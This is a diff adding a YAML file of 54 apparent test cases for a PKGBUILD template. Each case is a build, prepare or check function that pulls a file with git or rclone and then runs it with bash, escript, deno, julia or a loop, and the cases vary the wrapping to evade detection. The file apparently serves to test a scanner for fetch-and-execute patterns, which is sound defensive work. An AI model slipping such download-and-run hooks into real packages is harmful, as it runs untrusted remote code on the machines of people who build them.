@@ -1,0 +1,401 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 001-gp-wrap-bg
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (bash f.erl)
+  id: 002-gp-wrap-sub
+- vars:
+    payload: |
+      dl() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 003-gp-wrap-helper
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          bash f.erl
+        fi
+  id: 004-gp-wrap-carch
+- vars:
+    payload: |
+      build() {
+        case "$CARCH" in any) git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"; bash f.erl;; esac
+  id: 005-gp-wrap-case
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" && \
+          bash f.erl
+  id: 006-gp-wrap-and
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" &
+        wait
+        bash f.erl
+  id: 007-rc-wrap-bg
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        (bash f.erl)
+  id: 008-rc-wrap-sub
+- vars:
+    payload: |
+      dl() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 009-rc-wrap-helper
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+          bash f.erl
+        fi
+  id: 010-rc-wrap-carch
+- vars:
+    payload: |
+      build() {
+        case "$CARCH" in any) rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"; bash f.erl;; esac
+  id: 011-rc-wrap-case
+- vars:
+    payload: |
+      build() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" && \
+          bash f.erl
+  id: 012-rc-wrap-and
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true &
+        wait
+        bash f.erl
+  id: 013-gr-wrap-bg
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        (bash f.erl)
+  id: 014-gr-wrap-sub
+- vars:
+    payload: |
+      dl() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+      }
+      build() {
+        dl
+        bash f.erl
+  id: 015-gr-wrap-helper
+- vars:
+    payload: |
+      build() {
+        if [ "$CARCH" = x86_64 ]; then
+          git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+          bash f.erl
+        fi
+  id: 016-gr-wrap-carch
+- vars:
+    payload: |
+      build() {
+        case "$CARCH" in any) git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true; bash f.erl;; esac
+  id: 017-gr-wrap-case
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true && \
+          bash f.erl
+  id: 018-gr-wrap-and
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 019-gp-prepare-bash
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 020-gp-check-bash
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 021-gp-prepare-escript
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 022-gp-check-escript
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 023-gp-prepare-deno
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 024-gp-check-deno
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 025-gp-prepare-loop
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 026-gp-check-loop
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 027-gp-prepare-julialt
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 028-gp-check-julialt
+- vars:
+    payload: |
+      prepare() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 029-rc-prepare-bash
+- vars:
+    payload: |
+      check() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 030-rc-check-bash
+- vars:
+    payload: |
+      prepare() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 031-rc-prepare-escript
+- vars:
+    payload: |
+      check() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 032-rc-check-escript
+- vars:
+    payload: |
+      prepare() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 033-rc-prepare-deno
+- vars:
+    payload: |
+      check() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        deno f.erl
+  id: 034-rc-check-deno
+- vars:
+    payload: |
+      prepare() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 035-rc-prepare-loop
+- vars:
+    payload: |
+      check() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        for x in *.erl; do bash "$x"; done
+  id: 036-rc-check-loop
+- vars:
+    payload: |
+      prepare() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 037-rc-prepare-julialt
+- vars:
+    payload: |
+      check() {
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 038-rc-check-julialt
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        bash f.erl
+  id: 039-gr-prepare-bash
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        bash f.erl
+  id: 040-gr-check-bash
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        escript f.erl
+  id: 041-gr-prepare-escript
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        escript f.erl
+  id: 042-gr-check-escript
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        deno f.erl
+  id: 043-gr-prepare-deno
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        deno f.erl
+  id: 044-gr-check-deno
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        for x in *.erl; do bash "$x"; done
+  id: 045-gr-prepare-loop
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        for x in *.erl; do bash "$x"; done
+  id: 046-gr-check-loop
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        julia < f.erl
+  id: 047-gr-prepare-julialt
+- vars:
+    payload: |
+      check() {
+        git -C "$srcdir/harness-baseline-1.0.0" fetch origin "+refs/heads/main:refs/x" "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        git -C "$srcdir/harness-baseline-1.0.0" checkout -q refs/x -- f.erl
+        cd "$srcdir"
+        cp harness-baseline-1.0.0/f.erl f.erl 2>/dev/null || true
+        julia < f.erl
+  id: 048-gr-check-julialt
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        bash "$srcdir/f.erl"
+  id: 049-gp-xf-pb-bash
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      check() {
+        bash "$srcdir/f.erl"
+  id: 050-gp-xf-pc-bash
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      check() {
+        bash "$srcdir/f.erl"
+  id: 051-gp-xf-bc-bash
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      build() {
+        escript "$srcdir/f.erl"
+  id: 052-gp-xf-pb-escript
+- vars:
+    payload: |
+      prepare() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      check() {
+        escript "$srcdir/f.erl"
+  id: 053-gp-xf-pc-escript
+- vars:
+    payload: |
+      build() {
+        git -C "$srcdir/harness-baseline-1.0.0" pull origin main "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+      }
+      check() {
+        escript "$srcdir/f.erl"
+  id: 054-gp-xf-bc-escript
